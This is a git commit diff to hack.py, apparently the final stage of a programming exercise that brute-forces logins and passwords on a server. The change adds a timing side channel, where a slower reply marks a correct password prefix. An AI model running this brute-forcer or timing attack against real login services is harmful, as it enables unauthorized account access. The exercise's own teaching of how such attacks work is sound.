bc176ed5c1147639e1a0945766528b3427aa0720
M-Pank <plabpiat@gmail.com>
2020-10-01 16:30:40 +0300

    Final stage
    Stage 5/5

--- hack.py
+++ hack.py
@@ -23,8 +23,6 @@ def hack(ip, port):
         psy = i
         search = map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in psy)))
 
-
-
         for m in search:
             message = {"login": m, "password": " "}
             if send_response(message) == {"result": "Wrong password!"}:
@@ -40,15 +38,29 @@ def hack(ip, port):
     password = ""
     prepass = ""
     x = {"login":login, "password": ""}
+    #Time measurement
+    from datetime import datetime
+    def time_meas(start, finish):
+        return finish - start
+
+    start = datetime.now()
+    message = x
+    send_response(message)
+    finish = datetime.now()
+    x_time = time_meas(start, finish)
+
     while counter == 0:
         for m in alphabet_list:
             prepass = password + m
+            start = datetime.now()
             message = {"login": login, "password": prepass}
             resp = send_response(message)
-            if resp == {"result": "Exception happened during login"}:
+            finish = datetime.now()
+
+            if x_time < time_meas(start, finish):
                 password = prepass
                 break
-            elif resp == {"result": "Connection success!"}:
+            elif resp  == {"result": "Connection success!"}:
                 password = prepass
                 x["password"] = password
                 x = json.dumps(x)
